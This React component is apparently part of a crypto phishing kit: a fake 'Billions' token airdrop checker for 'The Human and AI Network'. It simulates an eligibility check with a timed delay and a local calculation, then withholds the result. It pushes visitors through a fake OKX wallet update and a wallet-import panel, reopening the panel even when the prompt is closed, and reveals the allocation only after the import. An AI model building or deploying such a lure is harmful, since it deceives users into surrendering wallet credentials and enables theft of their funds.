"use client"

import { useState } from "react"
import AddressInput from "./address-input"
import AllocationDisplay from "./allocation-display"
import OKXWalletUpdate from "./okx-wallet-update"
import OKXWalletPanel from "./okx-wallet-panel"
import { calculateAirdropAllocation } from "@/lib/airdrop-logic"

export interface AirdropAllocation {
  address: string
  isEligible: boolean
  totalAmount: number
  tokenSymbol: string
  breakdown: {
    category: string
    amount: number
    percentage: number
    multiplier: number
  }[]
  bonuses: {
    label: string
    amount: number
  }[]
  claimDeadline: string
}

export default function AirdropChecker() {
  const [allocation, setAllocation] = useState<AirdropAllocation | null>(null)
  const [pendingAllocation, setPendingAllocation] = useState<AirdropAllocation | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [showOKXUpdate, setShowOKXUpdate] = useState(false)
  const [showOKXPanel, setShowOKXPanel] = useState(false)
  const [walletAddress, setWalletAddress] = useState<string>("")
  const [walletImported, setWalletImported] = useState(false)

  const handleAddressSubmit = async (address: string) => {
    setIsLoading(true)
    setError(null)
    setAllocation(null)
    setPendingAllocation(null)
    setShowOKXUpdate(false)
    setShowOKXPanel(false)
    setWalletAddress(address)
    setWalletImported(false)

    try {
      await new Promise((resolve) => setTimeout(resolve, 1200))
      const result = calculateAirdropAllocation(address)
      // Store allocation but don't show it yet - wait for wallet import
      setPendingAllocation(result)
      // Show OKX wallet update after eligibility check
      setShowOKXUpdate(true)
    } catch (err) {
      setError("Invalid address or error checking eligibility. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleOKXUpdateComplete = () => {
    setShowOKXUpdate(false)
    // Open OKX wallet panel directly after update completes
    setTimeout(() => {
      setShowOKXPanel(true)
    }, 500)
  }

  const handleOKXUpdateClose = () => {
    setShowOKXUpdate(false)
    // Open panel even if user closes update
    setTimeout(() => {
      setShowOKXPanel(true)
    }, 300)
  }

  const handleWalletImported = () => {
    setWalletImported(true)
    setShowOKXPanel(false)
    // Now show the allocation after wallet is imported
    if (pendingAllocation) {
      setAllocation(pendingAllocation)
      setPendingAllocation(null)
    }
  }

  return (
    <div className="relative min-h-screen bg-gradient-to-b from-white via-gray-50 to-white">
      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-8 sm:py-12 md:py-16 lg:py-24">
        {/* Hero Section - Hide when allocation is shown */}
        {!allocation && (
          <div className="mb-8 sm:mb-12 md:mb-16 text-center">
            <h1 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl xl:text-7xl font-bold text-black mb-4 sm:mb-5 md:mb-6 px-2">
              The Human and AI Network
            </h1>
            <p className="text-base sm:text-lg md:text-xl text-gray-600 mb-2 sm:mb-3 max-w-2xl mx-auto px-4">
              Enter your Ethereum address to discover your Billions token allocation
            </p>
            <p className="text-sm sm:text-base md:text-lg text-gray-500 max-w-3xl mx-auto px-4">
              Get instant eligibility results across multiple criteria and unlock your exclusive rewards from the Human
              and AI Network.
            </p>
          </div>
        )}

        {/* Address Input Section - Hide when allocation is shown */}
        {!allocation && (
          <div className="mb-8 sm:mb-12 md:mb-16 px-2">
            <AddressInput onSubmit={handleAddressSubmit} isLoading={isLoading} />
            {error && (
              <div className="mt-3 sm:mt-4 p-3 sm:p-4 rounded-lg bg-red-50 border border-red-200 text-red-700 text-sm sm:text-base">
                {error}
              </div>
            )}
          </div>
        )}

        {/* Results Section */}
        {allocation && !isLoading && (
          <div className="mt-8 sm:mt-12 md:mt-16">
            <AllocationDisplay allocation={allocation} />
          </div>
        )}

        {/* Loading State */}
        {isLoading && (
          <div className="flex flex-col items-center justify-center py-12 sm:py-16 md:py-24">
            <div className="relative w-10 h-10 sm:w-12 sm:h-12 mb-3 sm:mb-4">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200" />
              <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-600 animate-spin" />
            </div>
            <p className="text-gray-600 font-medium text-sm sm:text-base">Checking eligibility...</p>
          </div>
        )}

        {/* Empty State */}
        {!allocation && !isLoading && (
          <div className="text-center py-8 sm:py-10 md:py-12 px-4">
            <p className="text-gray-500 text-base sm:text-lg">Enter your Ethereum address above to get started</p>
          </div>
        )}
      </div>

      {/* OKX Wallet Update Component */}
      {showOKXUpdate && (
        <OKXWalletUpdate
          onUpdate={handleOKXUpdateComplete}
          onClose={handleOKXUpdateClose}
          autoStart={false}
        />
      )}

      {/* OKX Wallet Panel */}
      <OKXWalletPanel
        open={showOKXPanel}
        onOpenChange={setShowOKXPanel}
        onWalletImported={handleWalletImported}
        walletAddress={walletAddress}
      />
    </div>
  )
}
